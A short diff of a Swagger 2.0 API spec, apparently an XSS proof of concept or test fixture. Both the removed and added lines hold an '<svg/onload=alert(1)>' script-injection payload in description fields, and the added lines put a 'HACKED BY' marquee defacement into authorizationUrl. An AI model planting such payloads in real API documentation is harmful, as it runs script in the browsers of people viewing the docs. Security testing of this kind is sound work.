@@ -1,13 +1,9 @@
 swagger: '2.0'
-securityDefinitions:
-  a:
-    type: oauth2
-    authorizationUrl: test
-      description: '"/></svg/onload=alert(1)><!--
 info:
-  version: "0.0.1"
-  title: Example Title
-  description: Please Authorize!
+    title: Example Title
+    authorizationUrl: <marquee><h1>HACKED BY RAGHAV</h1></marquee>
+    version: production
+    description: Please Authorize!'"/><svg/onload=alert(1)><!--
 paths:
   /:
     get:
